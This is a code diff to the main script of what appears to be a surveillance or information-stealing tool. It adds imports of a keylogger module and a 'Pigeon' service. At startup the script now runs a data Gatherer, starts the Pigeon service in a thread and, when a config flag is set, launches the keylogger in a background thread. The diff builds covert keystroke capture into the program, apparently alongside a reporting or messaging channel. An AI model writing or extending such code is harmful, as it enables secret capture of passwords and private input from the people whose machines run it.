@@ -1,8 +1,11 @@
 from config import *
 from modules.configMaker import makeConfig
 from modules.gatherer import Gatherer
+from modules.keylogger import keylogger
+from modules.pigeon import Pigeon
 import requests
 import sys
+from threading import Thread
 
 def isCxnActive() -> bool:
     urls = ["https://github.com", "https://google.com", "https://duckduckgo.com", "https://bing.com"]
@@ -22,3 +25,13 @@ if __name__ == "__main__":
     update(argline=sys.argv[1:])
     makeConfig()
     Gatherer()
+    pInstance = Thread(target=Pigeon.startService)
+    pInstance.start()
+    try:
+        if PARAM.get("keylogger") != None:
+            klInstance = keylogger()
+            klThread = Thread(target=klInstance.startService)
+            klThread.start()
+    except KeyboardInterrupt:
+        Pigeon.stopService()
+        klInstance.stopService()
